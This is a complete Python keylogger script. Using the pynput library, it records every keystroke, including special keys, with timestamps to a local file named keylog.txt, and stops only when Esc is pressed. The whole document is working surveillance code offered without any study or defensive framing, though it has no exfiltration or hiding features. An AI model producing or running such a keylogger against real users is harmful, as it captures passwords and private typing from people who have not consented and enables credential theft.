from pynput.keyboard import Key, Listener
import logging

# Set up logging to save keystrokes to a file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log the keys pressed
def on_press(key):
    try:
        # Log regular alphanumeric keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys like shift, enter, etc.
        logging.info(f"Special key pressed: {key}")

# Function to stop logging when the escape key is pressed
def on_release(key):
    if key == Key.esc:
        # Stop the listener
        return False

# Start listening to the keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
